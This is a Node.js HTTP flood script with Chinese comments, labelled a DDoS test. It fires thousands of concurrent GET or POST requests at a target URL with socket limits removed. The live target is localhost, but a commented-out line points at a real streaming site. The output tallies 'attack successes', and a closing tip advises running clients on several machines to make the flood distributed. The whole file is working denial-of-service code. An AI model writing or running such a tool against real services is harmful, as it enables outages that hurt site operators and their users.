const http = require('http');
const os = require('os');
const URL = require('url').URL;
const { performance } = require('perf_hooks'); // 测量精确时间

// 设置 HTTP Agent 的最大 Socket 连接数 (激进值)
http.globalAgent.maxSockets = Infinity; // 移除连接数限制

const TARGET_URL = 'http://127.0.0.1:8765/'; // 目标网址
// const TARGET_URL = 'https://www.huya.com/dank1ng'; // 目标网址
// const TARGET_URL = 'https://example.com/'; // 目标网址
const CONCURRENCY = 1000; // 激进的并发数
const REQUEST_TIMEOUT = 2000; // 缩短超时时间
const USE_POST = false; // 是否使用 POST 请求
const REQUEST_BODY_SIZE = 1024; // POST 请求体大小 (字节)
const MAX_REQUESTS = 5000; // 设置一个默认的最大请求数
const SHOW_RESPONSE_DATA = false; // 是否显示响应数据;  默认关闭，减少输出
const SUCCESS_STATUS_CODES = [200]; // 定义成功的状态码
const FAILED_REQUEST_THRESHOLD = 0.75; // 如果失败率超过 75%，则输出警告
    
// 从URL中提取主机名、端口和路径
const parsedUrl = new URL(TARGET_URL);
const HOST = parsedUrl.hostname;
const PORT = parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80); // 自动检测端口
const PATH = parsedUrl.pathname;
const PROTOCOL = parsedUrl.protocol.startsWith('https') ? require('https') : require('http'); // 根据协议选择模块

// 创建随机字符串 (用于 POST 请求体)
function generateRandomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const requestBody = USE_POST ? generateRandomString(REQUEST_BODY_SIZE) : "";

async function sendRequest() {
    return new Promise((resolve, reject) => {
        const options = {
            hostname: HOST,
            port: PORT,
            path: PATH,
            method: USE_POST ? 'POST' : 'GET',
            timeout: REQUEST_TIMEOUT,
            headers: {
                'Host': HOST, //  使用目标主机名，而不是 localhost
                'Connection': 'keep-alive',
                'User-Agent': 'DDosTestAgent',
                'Content-Type': 'text/plain', // POST 请求需要设置
                'Content-Length': Buffer.byteLength(requestBody) // POST 请求需要设置
            }
        };

        const req = PROTOCOL.request(options, (res) => { // 使用https或http模块
            let responseData = ''; // 用于存储响应数据

            res.on('data', (chunk) => {
                responseData += chunk; // 收集响应数据
            });

            res.on('end', () => {
                //  输出响应状态码和数据
                if (SHOW_RESPONSE_DATA) {
                    console.log(`Status Code: ${res.statusCode}`);
                    console.log(`Response Data: ${responseData}`); // 显示响应数据
                }

                // 检查状态码是否成功
                if (SUCCESS_STATUS_CODES.includes(res.statusCode)) {
                    resolve(true); // 成功
                } else {
                    resolve(false); // 失败
                }
            });
        });

        req.on('error', (err) => {
            // 降低错误日志级别
            console.warn('Request Error: ' + err.message);
            reject(err);
        });

        req.on('timeout', () => {
            console.warn('Request timed out');
            req.destroy();
            reject(new Error('Request timed out'));
        });

        if (USE_POST) {
            req.write(requestBody); // 发送请求体
        }
        req.end();
    });
}

async function flood(concurrency, maxRequests) {
    const startTime = performance.now(); // 使用 performance.now()
    let completedRequests = 0;
    let errors = 0;
    let successfulRequests = 0;

    const promises = [];

    for (let i = 0; i < maxRequests; i++) {
        promises.push(
            sendRequest()
                .then((success) => {
                    completedRequests++;
                    if (success) {
                        successfulRequests++;
                    } else {
                        errors++;
                    }
                })
                .catch(() => {
                    errors++;
                })
        );
    }

    await Promise.all(promises); // 等待所有请求完成

    const endTime = performance.now();
    const elapsedTime = (endTime - startTime) / 1000; // 秒

    console.log("请求完成，退出程序");
    console.log(`总运行时间: ${elapsedTime.toFixed(1)} 秒`);
    console.log(`总攻击成功次数: ${successfulRequests}`);
    console.log(`总错误次数: ${errors}`);
    console.log(`完成请求总数: ${completedRequests}`);

    const failureRate = errors / completedRequests;
    if (failureRate > FAILED_REQUEST_THRESHOLD) {
        console.warn("警告：总失败率过高，可能无法有效攻击目标。请检查目标服务器或调整参数。");
    }

    return successfulRequests;
}


async function main() {
    const concurrency = CONCURRENCY; // 大并发
    const maxRequests = parseInt(process.argv[2]) || MAX_REQUESTS; // 从命令行参数获取请求数
    console.log(`开始DDoS测试:  ${concurrency} 并发, 目标: ${TARGET_URL}, 最大请求数：${maxRequests}`);
    const successfulRequests = await flood(concurrency, maxRequests);
     console.log(`总攻击成功次数: ${successfulRequests}`); // 输出总的攻击成功次数

}

main();

console.log("\n提示: 为了模拟DDoS, 尝试同时运行多个客户端 (在不同的机器上).");